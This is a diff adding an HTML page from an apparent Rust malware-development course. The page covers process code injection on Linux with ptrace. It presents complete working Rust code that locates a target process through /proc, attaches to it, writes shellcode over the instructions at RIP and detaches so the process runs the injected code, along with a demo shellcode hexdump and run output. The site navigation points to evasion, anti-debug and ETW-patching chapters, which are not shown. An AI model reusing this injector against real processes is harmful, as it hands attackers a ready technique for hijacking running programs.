@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+      
+    
+
+      <title>Malware development in Rust</title>
+
+      
+      
+
+      <!-- CSS -->
+      
+      <link rel="stylesheet" href=" https://nu11busters.github.io/rust-maldev-course/book.css">
+      
+
+      
+      
+    </head>
+
+    <body>
+        <div class="menu">
+            
+            
+            <nav role="navigation">
+                <ul>
+                    
+                        
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/home/">
+                                    
+                                    Malware development in Rust
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/about/">
+                                    
+                                    About us
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/">
+                                    
+                                    Cargo
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/optimise/">
+                                                    
+                                                    Optimise Cargo
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/cross-compilation/">
+                                                    
+                                                    Cross-compilation
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/cargo/dynamic-library/">
+                                                    
+                                                    Dynamic library
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/">
+                                    
+                                    System APIs
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/windows-api/">
+                                                    
+                                                    Windows API
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/system/libc-api/">
+                                                    
+                                                    Libc API
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/">
+                                    
+                                    Cryptography
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/intro/">
+                                                    
+                                                    Introduction
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/rsa/">
+                                                    
+                                                    Asymmetric encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/aes/">
+                                                    
+                                                    Symmetric encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/sha256/">
+                                                    
+                                                    Hashing
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/df/">
+                                                    
+                                                    Diffie-Hellman
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/crypto/sockets/">
+                                                    
+                                                    Sockets with OpenSSL
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/">
+                                    
+                                    Code injection
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li class="active">
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/injection-with-ptrace/">
+                                                    
+                                                    Injection with PTRACE
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/">
+                                                    
+                                                    CreateRemoteThread
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/code_injection/process-hollowing/">
+                                                    
+                                                    Process Hollowing
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/">
+                                    
+                                    Obfuscation
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/strings/">
+                                                    
+                                                    Strings encryption
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/polymorphism/">
+                                                    
+                                                    Polymorphism
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/metamorphism/">
+                                                    
+                                                    Metamorphism
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/auto-remove/">
+                                                    
+                                                    Self deletion
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/obfuscation/dynamic-imports/">
+                                                    
+                                                    Dynamic imports
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/">
+                                    
+                                    Evasion
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/query-wmi/">
+                                                    
+                                                    Query wmi
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-ptrace/">
+                                                    
+                                                    Anti-debug with PTRACE
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-isdebuggerpresent/">
+                                                    
+                                                    IsDebuggerPresent
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/detect-sandbox/">
+                                                    
+                                                    Detect sandbox
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/fileless-execution/">
+                                                    
+                                                    Fileless on Linux
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/direct-syscalls/">
+                                                    
+                                                    Direct syscall
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/hook-detection/">
+                                                    
+                                                    Hook detection
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/hells/">
+                                                    
+                                                    Hell&#x27;s Gate
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/evasion/patch-etw/">
+                                                    
+                                                    Patch ETW
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/">
+                                    
+                                    Shellcode
+                                </a>
+                                
+                                    <ul>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/call-assembly-in-rust/">
+                                                    
+                                                    Call assembly in Rust
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/exec-shellcode-in-local/">
+                                                    
+                                                    Execute shellcode in local process
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-linux/">
+                                                    
+                                                    Generate shellcode for Linux
+                                                </a>
+                                            </li>
+                                        
+                                            <li >
+                                                <a href=" https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-windows/">
+                                                    
+                                                    Generate shellcode for Windows
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/conclusion/">
+                                    
+                                    Conclusion
+                                </a>
+                                
+                            </li>
+                        
+                            
+                            <li >
+                                
+                                <a href=" https://nu11busters.github.io/rust-maldev-course/credits/">
+                                    
+                                    Credits and ressources
+                                </a>
+                                
+                            </li>
+                        
+                    
+                </ul>
+            </nav>
+            
+            
+        </div>
+
+        <div class="page">
+            <div class="page__header">
+                <div class="menu-icon">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                
+                <span class="search-icon">🔎</span>
+                
+            </div>
+
+            <div class="page__content">
+                
+                <div class="search-container">
+                    <input id="search" type="search" placeholder="Search..">
+                    <div class="search-results">
+                        <div class="search-results__header"></div>
+                        <ul class="search-results__items"></ul>
+                    </div>
+                </div>
+                
+                <div class="book-content">
+                    
+    <h1>Injection with PTRACE</h1>
+    <p>In this section, we'll look at how the <code>ptrace</code> system call on Linux can be used to inject code into a running process to make it execute the code you want.</p>
+<p>The ptrace system call allows you to attach yourself to a process and control its execution, modify its memory space and consult its registers. It is used by debuggers such as GDB. Attaching to a process with this system call is called tracing.</p>
+<p>Here, we're going to modify the RIP register and replace the process instructions with our own.</p>
+<p>The target process is the following program, i.e. it is possible to attack any process as long as <a href="https://www.kernel.org/doc/html/v5.10//admin-guide/LSM/Yama.html">permissions allow</a>.</p>
+<p>This is our target program, <code>my_process.c</code>:</p>
+<pre data-lang="rust" style="background-color:#eff1f5;color:#4f5b66;" class="language-rust "><code class="language-rust" data-lang="rust"><span>#include &lt;stdio.h&gt;
+</span><span>#include &lt;unistd.h&gt;
+</span><span>
+</span><span>int </span><span style="color:#96b5b4;">main</span><span>() {
+</span><span>	</span><span style="color:#b48ead;">while</span><span>(</span><span style="color:#d08770;">1</span><span>) {
+</span><span>		</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Hi !</span><span>&quot;);
+</span><span>		</span><span style="color:#96b5b4;">sleep</span><span>(</span><span style="color:#d08770;">1</span><span>);
+</span><span>	}
+</span><span>}
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#eff1f5;color:#4f5b66;" class="language-bash "><code class="language-bash" data-lang="bash"><span>&gt;&gt;&gt; gcc </span><span style="color:#bf616a;">my_process.c -o</span><span> my_process
+</span><span>&gt;&gt;&gt; ./my_process
+</span><span style="color:#bf616a;">Hi</span><span> !
+</span><span style="color:#bf616a;">Hi</span><span> !
+</span><span style="color:#bf616a;">...
+</span></code></pre>
+<p>To use the <code>ptrace</code> call, we'll use the <strong>Nix</strong> library with the <code>ptrace</code> <em>feature</em>.</p>
+<pre data-lang="bash" style="background-color:#eff1f5;color:#4f5b66;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">cargo</span><span> add nix</span><span style="color:#bf616a;"> --features</span><span>=ptrace
+</span></code></pre>
+<p>Our Cargo.toml file contains the following dependencies:</p>
+<pre data-lang="toml" style="background-color:#eff1f5;color:#4f5b66;" class="language-toml "><code class="language-toml" data-lang="toml"><span>[dependencies]
+</span><span style="color:#bf616a;">nix </span><span>= { </span><span style="color:#bf616a;">version </span><span>= &quot;</span><span style="color:#a3be8c;">0.27.1</span><span>&quot;, </span><span style="color:#bf616a;">features </span><span>= [&quot;</span><span style="color:#a3be8c;">ptrace</span><span>&quot;] }
+</span></code></pre>
+<p>The Nix crate provides the various parameters available in <code>ptrace</code> in separate functions available in the <code>nix::sys::ptrace</code> module.</p>
+<p>Note that all these functions take as their first parameter the PID of the process on which the action is to be performed, and the call to the attach function must have already been called on the target process.</p>
+<p>Here's our instruction injection program:</p>
+<pre data-lang="rust" style="background-color:#eff1f5;color:#4f5b66;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#b48ead;">use </span><span>nix::sys::ptrace::{attach, detach, getregs, setregs, write};
+</span><span style="color:#b48ead;">use </span><span>nix::sys::wait::{waitpid, WaitPidFlag};
+</span><span style="color:#b48ead;">use </span><span>nix::unistd::Pid;
+</span><span style="color:#b48ead;">use </span><span>std::ffi::</span><span style="color:#b48ead;">c_void</span><span>;
+</span><span style="color:#b48ead;">use </span><span>std::fs;
+</span><span>
+</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">get_pid_from_name_attachable</span><span>(</span><span style="color:#bf616a;">process_name</span><span>: &amp;</span><span style="color:#b48ead;">str</span><span>) -&gt; Option&lt;pid&gt; {
+</span><span>    </span><span style="color:#b48ead;">let</span><span> pid_dirs = fs::read_dir(&quot;</span><span style="color:#a3be8c;">/proc</span><span>&quot;).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>    </span><span style="color:#b48ead;">for</span><span> dir_raw in pid_dirs {
+</span><span>        </span><span style="color:#b48ead;">if</span><span> dir_raw.</span><span style="color:#96b5b4;">is_err</span><span>() {
+</span><span>            </span><span style="color:#b48ead;">continue</span><span>;
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">let</span><span> dir = dir_raw.</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>        </span><span style="color:#b48ead;">let</span><span> dir_pid = dir.</span><span style="color:#96b5b4;">file_name</span><span>().</span><span style="color:#96b5b4;">to_str</span><span>().</span><span style="color:#96b5b4;">unwrap</span><span>().parse::&lt;</span><span style="color:#b48ead;">u32</span><span>&gt;();
+</span><span>        </span><span style="color:#b48ead;">if</span><span> dir_pid.</span><span style="color:#96b5b4;">is_err</span><span>() {
+</span><span>            </span><span style="color:#a7adba;">// we only want PIDs
+</span><span>            </span><span style="color:#b48ead;">continue</span><span>;
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">let</span><span> dir_pid = dir_pid.</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>        </span><span style="color:#b48ead;">match </span><span>fs::read(format!(&quot;</span><span style="color:#a3be8c;">/proc/</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;">/comm</span><span>&quot;, dir_pid)) {
+</span><span>            Ok(res) =&gt; {
+</span><span>                </span><span style="color:#b48ead;">let</span><span> comm_raw = String::from_utf8(res).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>                </span><span style="color:#b48ead;">let</span><span> comm = comm_raw.</span><span style="color:#96b5b4;">strip_suffix</span><span>(&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;).</span><span style="color:#96b5b4;">unwrap</span><span>();
+</span><span>                </span><span style="color:#b48ead;">if</span><span> comm == process_name
+</span><span>                    &amp;&amp; </span><span style="color:#96b5b4;">attach</span><span>(Pid::from_raw(dir_pid as </span><span style="color:#b48ead;">i32</span><span>)).</span><span style="color:#96b5b4;">is_ok</span><span>()
+</span><span>                </span><span style="color:#a7adba;">// Check if it has the same name and is attachable
+</span><span>                {
+</span><span>                    </span><span style="color:#b48ead;">return </span><span>Some(Pid::from_raw(dir_pid as </span><span style="color:#b48ead;">i32</span><span>));
+</span><span>                }
+</span><span>            }
+</span><span>            Err(_) =&gt; </span><span style="color:#b48ead;">continue</span><span>,
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style="color:#b48ead;">return </span><span>None;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">fn </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>    </span><span style="color:#b48ead;">let</span><span> shellcode = include_bytes!(&quot;</span><span style="color:#a3be8c;">../shellcode.bin</span><span>&quot;);
+</span><span>    </span><span style="color:#b48ead;">let</span><span> args: Vec&lt;String&gt; = std::env::args().</span><span style="color:#96b5b4;">collect</span><span>();
+</span><span>    </span><span style="color:#b48ead;">if</span><span> args.</span><span style="color:#96b5b4;">len</span><span>() != </span><span style="color:#d08770;">2 </span><span>{
+</span><span>        eprintln!(&quot;</span><span style="color:#a3be8c;">Usage: </span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;"> &lt;target process name&gt;</span><span>&quot;, args.</span><span style="color:#96b5b4;">get</span><span>(</span><span style="color:#d08770;">0</span><span>).</span><span style="color:#96b5b4;">unwrap</span><span>());
+</span><span>        </span><span style="color:#b48ead;">return 
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">let</span><span> process_name = args.</span><span style="color:#96b5b4;">get</span><span>(</span><span style="color:#d08770;">1</span><span>).</span><span style="color:#96b5b4;">unwrap</span><span>(); </span><span style="color:#a7adba;">// Target process
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// Wait for the process to change to a stopped state, then dump its registers
+</span><span>    </span><span style="color:#b48ead;">let</span><span> target_pid = </span><span style="color:#b48ead;">match </span><span style="color:#96b5b4;">get_pid_from_name_attachable</span><span>(process_name) {
+</span><span>        Some(v) =&gt; v,
+</span><span>        None =&gt; {
+</span><span>            panic!(&quot;</span><span style="color:#a3be8c;">Could not get process &#39;{}&#39;&#39;s pid or could not attach to it</span><span>&quot;, process_name);
+</span><span>        }
+</span><span>    };
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// Wait for the SIGSTOP signal sent to the process when the attach function was called
+</span><span>    </span><span style="color:#b48ead;">if let </span><span>Err(error) = </span><span style="color:#96b5b4;">waitpid</span><span>(target_pid, Some(WaitPidFlag::</span><span style="color:#d08770;">WUNTRACED</span><span>)) {
+</span><span>        panic!(
+</span><span>            &quot;</span><span style="color:#a3be8c;">Could not wait for the {} to change state: {}</span><span>&quot;,
+</span><span>            process_name, error
+</span><span>        );
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// Get registers to extract RIP
+</span><span>    </span><span style="color:#b48ead;">let mut</span><span> registers = </span><span style="color:#b48ead;">match </span><span style="color:#96b5b4;">getregs</span><span>(target_pid) {
+</span><span>        Ok(value) =&gt; value,
+</span><span>        Err(error) =&gt; panic!(
+</span><span>            &quot;</span><span style="color:#a3be8c;">Could not get registers for process &#39;{}&#39;: {}</span><span>&quot;,
+</span><span>            process_name, error
+</span><span>        ),
+</span><span>    };
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">let mut</span><span> writer_cursor = registers.rip;
+</span><span>    </span><span style="color:#a7adba;">// advance RIP of 2 to launch our shellcode
+</span><span>    registers.rip += </span><span style="color:#d08770;">2</span><span>;
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// Re-inject new RIP inside the process
+</span><span>    </span><span style="color:#b48ead;">if let </span><span>Err(error) = </span><span style="color:#96b5b4;">setregs</span><span>(target_pid, registers) {
+</span><span>        panic!(
+</span><span>            &quot;</span><span style="color:#a3be8c;">Unable to reset process &#39;{}&#39;&#39;s registers: {}</span><span>&quot;,
+</span><span>            process_name, error
+</span><span>        );
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// Write shellcode inside the memory of the process
+</span><span>    </span><span style="color:#b48ead;">for</span><span> byte in shellcode {
+</span><span>        </span><span style="color:#b48ead;">match unsafe </span><span>{
+</span><span>            </span><span style="color:#96b5b4;">write</span><span>(
+</span><span>                target_pid,
+</span><span>                writer_cursor as </span><span style="color:#b48ead;">*mut c_void</span><span>,
+</span><span>                *byte as </span><span style="color:#b48ead;">*mut c_void</span><span>,
+</span><span>            )
+</span><span>        } {
+</span><span>            Err(error) =&gt; panic!(&quot;</span><span style="color:#a3be8c;">Unable to write into process &#39;{}&#39; byte {}: {}</span><span>&quot;,process_name, byte, error),
+</span><span>            Ok(_) =&gt; writer_cursor += </span><span style="color:#d08770;">1
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#a7adba;">// we detach ourself from the process, allowing it to continue running
+</span><span>    </span><span style="color:#b48ead;">if let </span><span>Err(error) = </span><span style="color:#96b5b4;">detach</span><span>(target_pid, None) {
+</span><span>        panic!(
+</span><span>            &quot;</span><span style="color:#a3be8c;">Unable to detach from process &#39;{}&#39;: {}</span><span>&quot;,
+</span><span>            process_name, error
+</span><span>        );
+</span><span>    }
+</span><span>    </span><span style="color:#a7adba;">// here the target process has resumed execution on the shellcode
+</span><span>}
+</span></code></pre>
+<p>This program works as follows:</p>
+<ol>
+<li>Retrieve the PID of the target process by searching all folders in <code>/proc/</code> where the name is a PID and the process invocation command is the name of the process you are looking for, which must be attachable with <code>ptrace</code>.</li>
+<li>Wait for the process to be attached by waiting for it to be stopped with waitpid, the <code>SIGSTOP</code> signal indicating that the process is attached.</li>
+<li>Get the process registers with <code>getregs</code>, then get <code>RIP</code> in a variable, adding 2 to <code>RIP</code> so that our instructions are executed directly after we detach from the process.</li>
+<li>We write our instructions to the location pointed to by <code>RIP</code>.</li>
+<li>We detach from the process so that it can resume its course of execution.</li>
+</ol>
+<p>In this example, we're going to execute instructions to display &quot;hello world&quot;, here's its hexdump:</p>
+<pre style="background-color:#eff1f5;color:#4f5b66;"><code><span>00000000: 488d 3513 0000 006a 0158 6a0c 5a48 89c7  H.5....j.Xj.ZH..
+</span><span>00000010: 0f05 6a3c 5831 ff0f 05c3 6865 6c6c 6f20  ..j&lt;X1....hello 
+</span><span>00000020: 776f 726c 640a                           world.
+</span></code></pre>
+<p>When we run our program on the &quot;my_process&quot; process, we can see that the string &quot;hello world&quot; is displayed:</p>
+<pre style="background-color:#eff1f5;color:#4f5b66;"><code><span>&gt;&gt;&gt; cargo build
+</span><span>&gt;&gt;&gt; sudo ./target/debug/ptrace_inject my_process
+</span></code></pre>
+<pre style="background-color:#eff1f5;color:#4f5b66;"><code><span>&gt;&gt;&gt; ./my_process
+</span><span>Hi !
+</span><span>Hi !
+</span><span>Hi !
+</span><span>...
+</span><span>Hi !
+</span><span>Hi !
+</span><span>hello world
+</span><span>&gt;&gt;&gt; 
+</span></code></pre>
+
+
+                </div>
+            </div>
+
+            <div class="prev-link">
+                
+    
+        
+        
+        <a class="previous" href=" https://nu11busters.github.io/rust-maldev-course/code_injection/"><</a>
+    
+
+            </div>
+
+            <div class="next-link">
+                
+    
+        <a class="next" href=" https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/">></a>
+    
+
+            </div>
+        </div>
+
+        
+            
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/elasticlunr.min.js"></script>
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/search_index.en.js"></script>
+            
+            <script type="text/javascript" src=" https://nu11busters.github.io/rust-maldev-course/book.js"></script>
+        
+    </body>
+
+</html>
